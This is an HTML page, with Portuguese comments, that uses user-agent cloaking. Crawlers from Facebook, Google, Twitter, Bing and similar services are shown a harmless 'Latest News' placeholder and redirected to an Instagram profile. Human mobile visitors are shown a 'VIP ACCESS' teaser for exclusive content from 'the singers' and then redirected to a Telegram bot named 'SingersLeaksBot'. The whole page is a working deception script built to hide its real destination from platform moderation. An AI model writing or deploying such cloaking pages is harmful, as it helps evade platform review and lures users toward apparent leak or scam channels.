<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Latest News</title> <!-- Título corrigido -->
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background: #0a0a1a;
            color: #fff;
            height: 100vh;
            overflow: hidden;
        }
        
        /* PÁGINA WHITE (para bots) */
        #white-page {
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
            text-align: center;
        }
        
        /* PÁGINA BLACK (FULLSCREEN MOBILE) */
        #black-page {
            display: none;
            height: 100vh;
            width: 100vw;
            background: linear-gradient(135deg, #1e0028 0%, #2a0a3a 100%);
            text-align: center;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 0 15px;
        }
        
        .content {
            width: 100%;
            max-width: 350px;
            padding: 20px;
        }
        
        h1 {
            color: #ff2d55;
            font-size: 32px;
            margin-bottom: 15px;
            text-shadow: 0 2px 5px rgba(0,0,0,0.5);
            line-height: 1.2;
        }
        
        p {
            font-size: 20px;
            margin-bottom: 25px;
            line-height: 1.4;
            color: #eee;
        }
        
        .small {
            font-size: 14px;
            color: #aaa;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <!-- PÁGINA WHITE (para bots) -->
    <div id="white-page">
        <h1>Latest News</h1>
        <p>Loading today's headlines....</p>
        <!-- NOME RESTAURADO AQUI -->
        <p class="small">Fonte: <strong>The Television</strong></p>
    </div>

    <!-- PÁGINA BLACK (para humanos) -->
    <div id="black-page">
        <div class="content">
            <h1>VIP ACCESS</h1>
            <p>Exclusive content from the singers</p>
        </div>
    </div>

    <script>
        function isHuman() {
            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            const isBot = /bot|facebook|google|meta|twitter|slurp|bing/i.test(navigator.userAgent);
            return isMobile && !isBot;
        }

        if (isHuman()) {
            setTimeout(() => {
                document.getElementById('white-page').style.display = 'none';
                document.getElementById('black-page').style.display = 'flex';
                setTimeout(() => {
                    window.location.href = "https://t.me/SingersLeaksBot";
                }, 3000);
            }, 1000);
        } else {
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/atelevisao/";
            }, 3000);
        }
    </script>
</body>
</html>
